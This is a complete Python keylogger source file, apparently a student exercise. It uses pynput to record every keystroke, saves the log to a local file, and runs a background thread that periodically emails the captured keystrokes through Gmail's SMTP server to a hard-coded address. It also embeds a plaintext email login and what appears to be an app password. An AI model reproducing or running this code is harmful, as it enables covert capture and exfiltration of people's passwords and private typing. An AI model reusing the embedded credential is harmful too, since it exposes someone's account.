from pynput import keyboard
import smtplib, ssl, time, threading


# statics
FILE_NAME = "pulsaciones_grabadas.txt"
SEND_EMAIL_TIME = 2*60*60
MAX_INACTIVE_TIME = 2*60
TIMER_ACCURACY = 0.5

# global variables
finish = 0
full_log = ''
pressed = ''
inactive_timer = 0
email_timer = 0

# press action recorder
def on_press(key):

    global pressed
    global full_log
    global inactive_timer
    global finish
    inactive_timer = 0

    try:
        # exit with ESC key
        if key == keyboard.Key.esc:
            print(full_log)
            out_put_file(full_log)
            # Stop all threads
            finish = 1
            return False
        pressed = '{0}'.format(key)
        full_log += pressed
        print(pressed)
    except AttributeError:
        pressed = '{0}'.format(key)
        full_log += pressed
        print(pressed)

# inactive counter process
def inactive_counter_process():
    global inactive_timer
    global full_log
    global finish
    
    while finish == 0:
        time.sleep(TIMER_ACCURACY)
        inactive_timer += TIMER_ACCURACY
        if inactive_timer == MAX_INACTIVE_TIME:
            print(f"inactive since {inactive_timer} seconds ago")
            full_log += '\n'
            inactive_timer = 0


# out put to file
def out_put_file(text):
    f = open(FILE_NAME,"a")
    print(text, file = f,end='')
    f.close


# send email by scheduled time
def send_email_scheduled():
    global full_log
    global finish
    global email_timer

    while finish == 0:
        time.sleep(TIMER_ACCURACY)
        email_timer += TIMER_ACCURACY
        if email_timer == MAX_INACTIVE_TIME:
            send_email("qwang036@uoc.edu",'keyLogger',full_log)
            print('email sent')
            email_timer=0
            full_log = ''

# send email 
def send_email(to,subject,text):
    sender_email = "qwang036@uoc.edu" 
    password = "upfasobapwfkrwkv"
    port = 465  # For SSL
    smtp_server = "smtp.gmail.com"
    message = 'Subject: {}\n\n{}'.format(subject, text)
    context = ssl.create_default_context()

    with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, to, message)
        server.quit()



# MAIN PROCESS
keyListener = keyboard.Listener(on_press=on_press)
inactiveProcess = threading.Thread(target=inactive_counter_process)
emailProcess = threading.Thread(target=send_email_scheduled)

keyListener.start()
inactiveProcess.start()
emailProcess.start()

keyListener.join()
inactiveProcess.join()
emailProcess.join()
print('Bye')